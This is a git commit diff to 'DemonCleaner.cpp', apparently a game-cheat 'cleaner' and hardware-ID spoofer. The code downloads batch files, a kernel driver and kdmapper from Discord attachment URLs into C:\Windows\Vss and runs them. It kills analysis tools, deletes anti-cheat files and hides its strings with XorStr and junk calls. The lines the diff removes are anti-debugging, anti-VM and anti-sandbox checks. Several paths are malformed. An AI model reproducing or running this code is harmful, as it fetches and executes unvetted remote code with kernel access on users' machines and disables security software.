db88cd51424e3c38b5ee1ec24ecf05d32942dd28
ripped-oh <87819489+ripped-oh@users.noreply.github.com>
2021-08-24 10:05:41 -0700

    Update DemonCleaner.cpp

--- DemonCleaner.cpp
+++ DemonCleaner.cpp
@@ -2,183 +2,25 @@
 #include "xorstr.hpp"
 #include <string>
 #include <windows.h>
-#include <filesystem>
 #include <Urlmon.h>
 #include "junk-code.h"
-#include "protection.h"
 #include <Wininet.h>
-#include <conio.h>
 #include <stdlib.h>
 #include <vector>
 
-#pragma warning(disable : 4996)
-#pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "urlmon.lib")
-__declspec(naked) void AntiAttach() {
-    __asm {
-        jmp ExitProcess
-    }
-}
+
 using namespace junkcode;
 
-
-    
-
-BOOL IsSandboxie()
-{
-    if (GetModuleHandle("SbieDll.dll") != NULL)
-        MessageBoxA(NULL, "SANDBOXIE DETECTED.", NULL, MB_OK);
-        exit(1);
-
-
-    
-}
-string replaceAll(string subject, const string& search,
-    const string& replace) {
-    size_t pos = 0;
-    while ((pos = subject.find(search, pos)) != string::npos) {
-        subject.replace(pos, search.length(), replace);
-        pos += replace.length();
-    }
-    return subject;
-}
-
-string DownloadString(string URL) {
-    HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
-    HINTERNET urlFile;
-    string rtn;
-    if (interwebs) {
-        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
-        if (urlFile) {
-            char buffer[2000];
-            DWORD bytesRead;
-            do {
-                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
-                rtn.append(buffer, bytesRead);
-                memset(buffer, 0, 2000);
-            } while (bytesRead);
-            InternetCloseHandle(interwebs);
-            InternetCloseHandle(urlFile);
-            string p = replaceAll(rtn, "|n", "\r\n");
-            return p;
-        }
-    }
-    InternetCloseHandle(interwebs);
-    string p = replaceAll(rtn, "|n", "\r\n");
-    return p;
-}
-BOOL IsVM()
-{
-    HKEY hKey;
-    int i;
-    char szBuffer[64];
-    const char* szProducts[] = { "*VMWARE*", "*VBOX*", "*VIRTUAL*" };
-
-    DWORD dwSize = sizeof(szBuffer) - 1;
-
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
-    {
-        if (RegQueryValueEx(hKey, "0", NULL, NULL, (unsigned char*)szBuffer, &dwSize) == ERROR_SUCCESS)
-        {
-            for (i = 0; i < _countof(szProducts); i++)
-            {
-                if (strstr(szBuffer, szProducts[i]))
-                {
-                    RegCloseKey(hKey);
-                    MessageBoxA(NULL, "VMBOX DETECTED.", NULL, MB_OK);
-                    exit(1);
-                }
-            }
-        }
-
-        RegCloseKey(hKey);
-    }
-
-    return FALSE;
-}
-void DebugChecker()
-{
-    FreeConsole();
-
-    if (IsDebuggerPresent()) {
-        MessageBox(0, "debugger detected", "locked!", 16);
-        exit(0);
-        
-    }
-}
-
-void antiattachlmao()
-{
-    
-    HANDLE hProcess = GetCurrentProcess();
-    lnttirs();
-    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
-    tlmisir();
-    FARPROC func_DbgUiRemoteBreakin = GetProcAddress(hMod, "DbgUiRemoteBreakin");
-    akfuxnl();
-    WriteProcessMemory(hProcess, func_DbgUiRemoteBreakin, AntiAttach, 6, NULL);
-    plvbjwh();
-    SetConsoleTitle("Demon Cleaner V1.0");
-    rydekem();
-}
-void WindowFinder()
-{
-
-    rydekem();
-    if (FindWindow(NULL, "x32dbg"))
-    {
-        MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
-        exit(0);
-    }
-    lnttirs();
-    if (FindWindow(NULL, "x64dbg"))
-    {
-        MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
-        exit(0);
-    }
-    plvbjwh();
-    if (FindWindow(NULL, "OllyDbg"))
-    {
-        MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
-        exit(0);
-    }
-    tlmisir();
-    if (FindWindow(NULL, "FiddlerEverywhere"))
-    {
-        MessageBoxA(NULL, "Web Debugger Found", "Notification", MB_OK);
-        exit(0);
-    }
-    akfuxnl();
-}
-void Output()
-{
-    SetLastError(0);
-  
-    OutputDebugStringA("Hello, debugger");
-    if (GetLastError() != 0)
-    {
-        MessageBoxA(NULL, "Debugger Detected", "", MB_OK);
-        exit(0);
-    }
-    
-}
 void apex()
 {
-    
 
-
-    
-
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    
     akfuxnl();
-    std::string apex = (XorStr("https://cdn.discordapp.com/attachments/702060437168193556/878306088104124416/Apex.bat"));
-    std::string apexpath = "C:\Apex.bat";
+    std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879746005178921010/apex.bat"));
+    std::string apexpath = "C:\\Windows\Vss\Apex.bat";
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
-    system("Start C:\Apex.bat");
+    system("cd C:\\Windows\Vss\ ");
+    system("Start C:\\Windows\Vss\Apex.bat");
     
 
 }
@@ -186,93 +28,61 @@ void gta()
 {
     
 
-
-    
-
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
     
 
     akfuxnl();
-    std::string gta = (XorStr("https://cdn.discordapp.com/attachments/784033421747814400/877942560830685194/gta.bat"));
-    std::string gtapath = "C:\gta.bat";
+    std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879746003085959278/gta.bat"));
+    std::string gtapath = "C:\\Windows\Vss\gta.bat";
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
-    system("Start C:\gta.bat");
+    system("cd C:\\Windows\Vss\ ");
+    system("Start C:\\Windows\Vss\gta.bat");
 
 }
 void fortnite()
 {
-    
-
 
     
 
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    
     akfuxnl();
-    std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/878937010574852106/Fortnite.bat"));
-    std::string fortnitepath = "C:\Fortnite.bat";
+    std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879746001928323092/Fortnite.bat"));
+    std::string fortnitepath = "C:\\Windows\Vss\Fortnite.bat";
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
-    system("Start C:\Fortnite.bat");
+    system("cd C:\\Windows\Vss\ ");
+    system("Start C:\\Windows\Vss\Fortnite.bat");
 }
 void fishingplanet()
 {
-    
 
-
-    
-
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
     
 
     akfuxnl();
-    std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/869679952444940298/877944079139373066/fishing-planet.bat"));
-    std::string fishingplanetpath = "C:\Fishing-planet.bat";
+    std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879746000506478592/fishing-planet.bat"));
+    std::string fishingplanetpath = "C:\\Windows\Vss\Fishing-planet.bat";
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
-    system("Start C:\Fishing-planet.bat");
+    system("cd C:\\Windows\Vss\ ");
+    system("Start C:\\Windows\Vss\Fishing-planet.bat");
 
 }
 void cod()
 {
-    
-
 
     
 
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    
     akfuxnl();
-    std::string cod = (XorStr("https://cdn.discordapp.com/attachments/702060437168193556/878321115284516864/cw.bat"));
-    std::string codpath = "C:\Cold-Ware.bat";
+    std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745997213950052/Cold-Ware.bat"));
+    std::string codpath = "C:\\Windows\Vss\Cold-Ware.bat";
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
-    system("Start C:\Cold-Ware.bat");
+    system("cd C:\\Windows\Vss\ ");
+    system("Start C:\\Windows\Vss\Cold-Ware.bat");
 
     
 }
 
 
 void cleaner(){
-    
-
 
     
 
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    
     rydekem();
     plvbjwh();
     tlmisir();
@@ -305,15 +115,15 @@ void cleaner(){
     system(XorStr("taskkill /F /IM MSBuild.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM wcg.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM r5apex.exe 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\Windows\Capcom.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\Vss\ Windows\Capcom.sys 2>NULL").c_str());
     system(XorStr("del /F /IM del /f %temp%\* 2>NULL").c_str());
     system(XorStr("del /F /IM D:\steam\depotcache\* 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\steam\depotcache\* 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.exe 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\Windows\KsDumperDriver.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\Windows\System32\Capcom.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\Windows\System32\KsDumperDriver.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\Vss\ steam\depotcache\* 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\Vss\ Program Files (x86)\EasyAntiCheat\EasyAntiCheat.exe 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\Vss\ Program Files (x86)\EasyAntiCheat\EasyAntiCheat.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\Vss\ Windows\KsDumperDriver.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\Vss\ Windows\System32\Capcom.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\Vss\ Windows\System32\KsDumperDriver.sys 2>NULL").c_str());
     system(XorStr("sc stop capcom").c_str());
     system(XorStr("sc delete capcom").c_str());
     system(XorStr("taskkill /F /IM cef_subprocces.exe 2>NULL").c_str());
@@ -391,6 +201,19 @@ void cleaner(){
     system(XorStr("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
 
 }
+void deleter()
+{
+    system("cd C:\\Windows\Vss\ ");
+    system(XorStr("del C:\\Windows\Vss\woof.sys").c_str());
+    system(XorStr("del C:\\Windows\Vss\mapper.exe").c_str());
+    system(XorStr("del C:\\Windows\Vss\Cold-Ware.bat").c_str());
+    system(XorStr("del C:\\Windows\Vss\Fishing-Planet.bat").c_str());
+    system(XorStr("del C:\\Windows\Vss\Apex.bat").c_str());
+    system(XorStr("del C:\\Windows\Vss\gta.bat").c_str());
+    system(XorStr("del C:\\Windows\Vss\Fortnite.bat").c_str());
+
+
+}
 void safeshutdown()
 {
     rydekem();
@@ -398,16 +221,8 @@ void safeshutdown()
     tlmisir();
     akfuxnl();
     lnttirs();
-    
 
 
-    
-
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    
     rydekem();
     plvbjwh();
     tlmisir();
@@ -415,21 +230,7 @@ void safeshutdown()
     lnttirs();
 
 
-    std::remove("C:\Cold-Ware.bat");
-    std::remove("C:\Fishing-planet.bat");
-    std::remove("C:\Apex.bat");
-    std::remove("C:\gta.bat");
-    std::remove("C:\Fortnite.bat");
-    std::remove("C:\mapper.exe");
-    std::remove("C:\woof.sys");
-
-    std::remove("woof.sys");
-    std::remove("mapper.exe");
-    std::remove("Cold-Ware.bat");
-    std::remove("Fishing-planet.bat");
-    std::remove("Apex.bat");
-    std::remove("gta.bat");
-    std::remove("Fortnite.bat");
+    
 
     system(XorStr("cls").c_str());
     rydekem();
@@ -463,28 +264,19 @@ void spoofer()
     tlmisir();
     akfuxnl();
     lnttirs();
-    
-
 
     
-
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    
-
 
     akfuxnl();
     string spoofer = (XorStr("https://cdn.discordapp.com/attachments/702060437168193556/878327452898840667/NewWoof.sys"));
-    string spooferpath = "C:\\woof.sys"; //change to dir you want
+    string spooferpath = "C:\\Windows\Vss\woof.sys"; //change to dir you want
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
-    {
-        string mapper = (XorStr("https://cdn.discordapp.com/attachments/702060437168193556/878327688694202368/kdmapper_1.exe"));
-        string mapperpath = "C:\\mapper.exe";//change to dir you want
-        URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
-    }
-    system("C:\\mapper.exe C:\\woof.sys");
+    
+    string mapper = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
+    string mapperpath = "C:\\Windows\Vss\mapper.exe";//change to dir you want
+    URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
+    system("cd C:\\Windows\Vss\ ");
+    system("C:\\Windows\Vss\mapper.exe C:\\Windows\Vss\woof.sys");
     Sleep(2000);
     MessageBox(NULL, ("wait 60 Seconds For Your Bios And Baseboard To Be Spoofed"), ("warning"), MB_OK | MB_SYSTEMMODAL);
     Sleep(60000);
@@ -493,20 +285,12 @@ void spoofer()
     tlmisir();
     akfuxnl();
     lnttirs();
+    deleter();
     safeshutdown();
 }
 void mainbot()
 {
-    
-
-
-    
-
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    
+    system(XorStr("start https://discord.gg/MT9sApTneu").c_str());
     system(XorStr("cls").c_str());
     std::cout << "After you use the cleaner, verify the game's integrity files\n";
     Sleep(2000);
@@ -527,42 +311,11 @@ void mainbot()
     spoofer();
     
 }
-void accouting()
-{
-
-    
-
-
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    system(XorStr("cls").c_str());
-    std::vector<string> ips;
-    
-    
-
-    
-    
-
-    
-    
-    
-}
-
 
 
 
 int main()
 {
-    
-    
-
-    protection::ErasePEheader();
-    antiattachlmao();
-    WindowFinder();
-    Output();
-    accouting();
-
+    mainbot();
 }
 
